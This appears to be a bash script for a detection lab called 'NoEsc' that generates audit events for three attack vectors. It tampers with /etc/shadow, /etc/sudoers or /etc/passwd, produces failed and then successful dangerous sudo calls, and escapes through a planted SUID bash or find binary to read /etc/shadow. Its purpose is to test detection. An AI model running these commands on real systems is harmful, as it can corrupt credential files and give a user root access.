#!/bin/bash

# NoEsc lab execution: generate malicious-sequence audit events for all 3 vectors.

if [ "$EUID" -eq 0 ]; then
  echo "[-] Run this as a normal user, not root."
  exit 1
fi

set -u

SUDO_PASS="${NOESC_LAB_PASSWORD:-}"

FAILED_MIN="${NOESC_FAILED_SUDO_MIN:-1}"
FAILED_MAX="${NOESC_FAILED_SUDO_MAX:-4}"
AUTH_FAIL_CAP="${NOESC_AUTH_FAIL_CAP:-1}"

if ! [[ "$FAILED_MIN" =~ ^[0-9]+$ ]]; then
  FAILED_MIN=1
fi
if ! [[ "$FAILED_MAX" =~ ^[0-9]+$ ]]; then
  FAILED_MAX=4
fi
if ! [[ "$AUTH_FAIL_CAP" =~ ^[0-9]+$ ]]; then
  AUTH_FAIL_CAP=1
fi

if [ "$FAILED_MIN" -lt 1 ]; then
  FAILED_MIN=1
fi
if [ "$FAILED_MAX" -gt 4 ]; then
  FAILED_MAX=4
fi
if [ "$FAILED_MAX" -lt "$FAILED_MIN" ]; then
  FAILED_MAX="$FAILED_MIN"
fi
if [ "$AUTH_FAIL_CAP" -lt 0 ]; then
  AUTH_FAIL_CAP=0
fi
if [ "$AUTH_FAIL_CAP" -gt 4 ]; then
  AUTH_FAIL_CAP=4
fi

echo "==============================================="
echo "NoEsc Lab Breakout (Randomized)"
echo "==============================================="

SENSITIVE_TARGETS=("/etc/shadow" "/etc/sudoers" "/etc/passwd")
TAMPER_TOOLS=("cat" "touch" "echo" "sed")

target="${SENSITIVE_TARGETS[$RANDOM % ${#SENSITIVE_TARGETS[@]}]}"
tool="${TAMPER_TOOLS[$RANDOM % ${#TAMPER_TOOLS[@]}]}"

echo "[*] Phase 1/3 - Sensitive file tampering attempt"
echo "    Target: $target"
echo "    Tool:   $tool"

case "$tool" in
  cat)
    cat "$target" > /dev/null 2>&1 || true
    ;;
  touch)
    touch "$target" > /dev/null 2>&1 || true
    ;;
  echo)
    echo "# noesc-lab-$RANDOM" >> "$target" 2> /dev/null || true
    ;;
  sed)
    sed -i '$a#noesc-lab' "$target" > /dev/null 2>&1 || true
    ;;
esac

sleep 1


echo "[*] Phase 2/3 - Stateful sudo misuse"

failed_attempts=$(( (RANDOM % (FAILED_MAX - FAILED_MIN + 1)) + FAILED_MIN ))
echo "    Failed sudo attempts: $failed_attempts"

# Keep real bad-password attempts low to avoid PAM lockouts while still
# generating sudo misuse sequence noise for stateful detection.
auth_failed_attempts="$failed_attempts"
if [ "$auth_failed_attempts" -gt "$AUTH_FAIL_CAP" ]; then
  auth_failed_attempts="$AUTH_FAIL_CAP"
fi
non_auth_failed_attempts=$(( failed_attempts - auth_failed_attempts ))
echo "    Auth failures: $auth_failed_attempts, non-auth failures: $non_auth_failed_attempts"

# Force password re-auth so failed attempts are actually recorded.
sudo -k

for i in $(seq 1 "$auth_failed_attempts"); do
  printf 'wrongpass-%s\n' "$RANDOM" | sudo -S -p '' true > /dev/null 2>&1 || true
done

for i in $(seq 1 "$non_auth_failed_attempts"); do
  sudo -n true > /dev/null 2>&1 || true
done

lab_file="/tmp/noesc_lab_target"
echo "seed-$RANDOM" > "$lab_file"

SUDO_DANGEROUS=(
  "chmod 777 $lab_file"
  "chown root:root $lab_file"
  "chmod u+s $lab_file"
)

danger_cmd="${SUDO_DANGEROUS[$RANDOM % ${#SUDO_DANGEROUS[@]}]}"

echo "    Attempting successful sudo command: sudo $danger_cmd"

# Re-authenticate after forced failures.
if [ -n "$SUDO_PASS" ]; then
  printf '%s\n' "$SUDO_PASS" | sudo -S -p '' -v > /dev/null 2>&1 || {
    echo "[-] NOESC_LAB_PASSWORD failed during sudo re-auth (possibly lockout)."
    echo "    Try: faillock --user $USER --reset (as root), then rerun."
    exit 1
  }
else
  sudo -v || {
    echo "[-] Could not obtain sudo credentials for success phase."
    exit 1
  }
fi

if ! sudo -n bash -c "$danger_cmd" > /dev/null 2>&1; then
  if [ -n "$SUDO_PASS" ]; then
    printf '%s\n' "$SUDO_PASS" | sudo -S -p '' bash -c "$danger_cmd" > /dev/null 2>&1 || true
  else
    sudo bash -c "$danger_cmd" > /dev/null 2>&1 || true
  fi
fi

sleep 1

echo "[*] Phase 3/3 - SUID abuse"

if [ ! -f /tmp/.vuln_path ]; then
  echo "[-] Missing /tmp/.vuln_path. Run sudo ./setup_lab_vulns.sh first."
  exit 1
fi

suid_bin="$(cat /tmp/.vuln_path)"
if [ ! -x "$suid_bin" ]; then
  echo "[-] Planted SUID binary is missing or not executable: $suid_bin"
  exit 1
fi

kind="unknown"
if [ -f /tmp/.vuln_kind ]; then
  kind="$(cat /tmp/.vuln_kind)"
fi

echo "    Using payload: $suid_bin (kind=$kind)"

if [ "$kind" = "bash" ]; then
  "$suid_bin" -p -c 'id > /dev/null 2>&1; head -n 1 /etc/shadow > /dev/null 2>&1' || true
elif [ "$kind" = "find" ]; then
  "$suid_bin" . -exec /bin/sh -p -c 'id > /dev/null 2>&1; head -n 1 /etc/shadow > /dev/null 2>&1' \; -quit || true
else
  "$suid_bin" -p -c 'id > /dev/null 2>&1; head -n 1 /etc/shadow > /dev/null 2>&1' || true
  "$suid_bin" . -exec /bin/sh -p -c 'id > /dev/null 2>&1; head -n 1 /etc/shadow > /dev/null 2>&1' \; -quit || true
fi

echo "[+] Breakout run complete"
